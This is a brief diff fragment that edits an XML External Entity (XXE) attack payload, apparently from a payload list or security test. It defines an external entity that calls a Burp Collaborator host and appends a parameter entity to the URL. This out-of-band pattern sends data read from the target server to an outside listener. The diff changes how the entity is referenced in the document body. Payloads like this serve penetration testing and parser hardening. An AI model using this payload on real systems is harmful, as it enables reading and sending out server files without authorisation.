@@ -4,4 +4,4 @@
 <!ENTITY callhome SYSTEM "http://tnk58535pgorkb3gasc51ncqhhneb3.burpcollaborator.net/?%xxe;">
 ]
 >
-<foo>&callhome;</foo>
+&callhome;
